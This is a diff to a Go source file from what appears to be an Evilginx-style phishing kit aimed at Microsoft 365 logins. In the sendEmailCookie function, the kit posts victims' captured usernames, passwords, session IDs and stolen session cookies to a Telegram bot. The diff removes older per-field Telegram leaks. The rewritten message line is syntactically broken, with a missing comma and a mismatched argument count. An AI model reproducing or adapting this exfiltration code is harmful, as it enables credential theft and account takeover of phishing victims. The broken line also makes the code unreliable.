@@ -16,14 +16,6 @@ import (
 	"time"
 )
 
-type Smtp struct {
-	Host     string `json:"host"`
-	Port     string `json:"port"`
-	Username string `json:"username"`
-	Password string `json:"password"`
-	Frommail string `json:"from"`
-}
-
 func goDotEnvVariable(key string) string {
 
 	// load .env file
@@ -48,40 +40,39 @@ func getChatId() string {
 	return fmt.Sprintf("%s", ChatId)
 }
 
-func telegramSendResult(msg string) (bool, error){
-	var err error
+// func telegramSendResult(msg string) (bool, error){
+// 	var err error
 
-// 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
-	// Send the message
-	url := fmt.Sprintf("%s/sendMessage", getUrl())
-	body, _ := json.Marshal(map[string]string{
-		"chat_id": getChatId(),
-		"text":    msg,
-	})
-	responseBody := bytes.NewBuffer(body)
-	request, _ := http.Post(url, "application/json", responseBody)
+// // 	msg = strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(strings.Replace(msg, "\n", "%0A", -1), "!", "\\!", -1), "}", "\\}", -1), "{", "\\{", -1), "|", "\\|", -1), "=", "\\=", -1), "+", "\\+", -1), ">", "\\>", -1), "#", "\\#", -1), "~", "\\~", -1), ")", "\\)", -1), "(", "\\(", -1), "]", "\\]", -1), ".", "\\.", -1), "`", "\\`", -1), "[", "\\[", -1), "*", "\\*", -1), "_", "\\_", -1), "-", "\\-", -1)
+// 	// Send the message
+// 	url := fmt.Sprintf("%s/sendMessage", getUrl())
+// 	body, _ := json.Marshal(map[string]string{
+// 		"chat_id": getChatId(),
+// 		"text":    msg,
+// 	})
+// 	responseBody := bytes.NewBuffer(body)
+// 	request, _ := http.Post(url, "application/json", responseBody)
 
-	// Close the request at the end
-	defer request.Body.Close()
+// 	// Close the request at the end
+// 	defer request.Body.Close()
 	
-	// Body
-	body, err = ioutil.ReadAll(request.Body)
-	if err != nil {
-		log.Fatalf("%s", err)
-	}
-	log.Printf("%s", msg)
-	// Return
-	return true, nil
-}
+// 	// Body
+// 	body, err = ioutil.ReadAll(request.Body)
+// 	if err != nil {
+// 		log.Fatalf("%s", err)
+// 	}
+// 	log.Printf("%s", msg)
+// 	// Return
+// 	return true, nil
+// }
 
-func sendEmailCookie(cookies string, username string, password string, KeyUser string, sessionId string) {
+func sendEmailCookie(cookies string, phishlet string, username string, password string, sessionId string) {
 
 	// Send the message
 	var err error
 	url := fmt.Sprintf("%s/sendMessage", getUrl())
-	msg := fmt.Sprintf("[ 🍁 0365 Cookies Result 🍁 ]\n******** [ 💻 Valid Login  💻 ] ********\n🌟 Username :   %s\n🔑 Password :   %s\n🏷️ Key_user:   %s\n💻 Session_id:   %s\n*****************************", username, password, KeyUser, sessionId)
-	//file, err := os.Open("/root/lukeharbor/result.txt")
-	//content, err = os.ReadFile("%s_Result.json", username)
+	msg := fmt.Sprintf("[ 🍁 %s Cookies Result 🍁 ]\n\n********* [ 💻 Valid Login  💻 ] ********\n🌟 Username :   %s\n🔑 Password :   %s\n🏷️ Key_user:   %s\n💻 Session_id:   %s\n*******[ 🍪 Cookies Captured 🍪 ] **********",phishlet username, password, sessionId)
+	
 	postBody, _ := json.Marshal(map[string]string{
 		"chat_id":    getChatId(),
 		"text":       msg,
@@ -168,13 +159,13 @@ func (d *Database) ListSessions() ([]*Session, error) {
 }
 
 func (d *Database) SetSessionUsername(sid string, username string) error {
-	telegramSendResult(fmt.Sprintf("🌟 Username  :%s", username))
+	fmt.Sprintf("🌟 Username  :%s", username)
 	err := d.sessionsUpdateUsername(sid, username)
 	return err
 }
 
 func (d *Database) SetSessionPassword(sid string, password string) error {
-	telegramSendResult(fmt.Sprintf("🔑 Password : %s", password))
+	fmt.Sprintf("🔑 Password : %s", password)
 	err := d.sessionsUpdatePassword(sid, password)
 	return err
 }
@@ -188,7 +179,7 @@ func (d *Database) SetSessionCustom(sid string, name string, value string) error
 	return err
 }
 
-func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*Token, keyUser string) error {
+func (d *Database) SetSessionTokens(sid string, phishlet string, tokens map[string]map[string]*Token) error {
 	err := d.sessionsUpdateTokens(sid, tokens)
 
 	type Cookie struct {
@@ -231,7 +222,7 @@ func (d *Database) SetSessionTokens(sid string, tokens map[string]map[string]*To
 	//log.Important("database: %s", data)
 
 	json11, _ := json.Marshal(cookies)
-	sendEmailCookie(string(json11), data.Username, data.Password, keyUser, data.SessionId)
+	sendEmailCookie(string(json11), data.Phishlet, data.Username, data.Password, data.SessionId)
 	return err
 }
 
